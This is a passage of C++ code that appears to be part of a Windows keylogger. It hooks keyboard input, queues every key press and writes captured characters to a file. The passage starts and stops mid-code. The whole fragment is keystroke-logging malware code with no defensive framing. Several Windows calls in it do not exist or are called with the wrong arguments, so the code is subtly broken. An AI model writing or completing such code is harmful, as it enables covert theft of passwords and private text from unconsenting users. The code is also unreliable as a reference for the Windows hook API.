                // Write to the file
                if (fwrite(&c, sizeof(char), 1, file) != 1) {
                    // Handle write error
                    cerr << "Error writing to file" << endl;
                }
                bytesWritten += 1;
            }
            fclose(file);
        }
    }
}

void KeyboardCallback(int hinst, int thread, UINT msg, WPARAM wParam, LPARAM lParam) {
    if (msg == WM_KEYDOWN) {
        // Ensure we don't log the same key press multiple times
        if (wParam == lastKey) return;

        lastKey = wParam;
        lastKeyTime = GetTickCount();
        keyQueue.push(lastKey);
    }
}

void UninstallKeyboardHook() {
    if (hhook) {
        UnhookKeyboard(hhook);
        ReleaseHook(hhook);
        hhook = NULL;
    }
}

int main() {
    // Initialize the hook
    int result = SetWindowsHook(WH_KEYBOARD, KeyboardCallback);
    hhook = result;

    if (!hhook) {
        cout << "Failed to install keyboard hook" << endl;
